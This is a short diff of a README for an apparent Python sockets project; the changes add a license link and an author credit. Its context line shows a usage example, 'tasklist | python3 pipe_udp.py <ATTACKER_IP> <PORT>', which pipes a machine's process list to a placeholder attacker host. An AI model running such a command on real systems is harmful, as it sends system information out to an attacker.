@@ -114,4 +114,7 @@ tasklist | python3 pipe_udp.py <ATTACKER_IP> <PORT>
 This project is licensed under the MIT License. See the `LICENSE` file for details.
 
 ```
+https://github.com/nuxyel/sockets-in-python/blob/main/LICENSE
 ```
+
+by _r3n4n_
